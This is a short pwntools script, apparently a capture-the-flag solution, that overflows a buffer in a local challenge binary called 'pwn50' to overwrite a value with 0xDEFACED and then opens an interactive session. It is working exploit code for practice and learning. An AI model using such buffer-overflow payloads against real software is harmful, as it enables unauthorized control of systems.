from pwn import *

p = process("./pwn50")

payload="bu"
payload+="g"*(0x2e-0x18)
payload+=p64(0xDEFACED)
p.sendline(payload)

p.interactive()
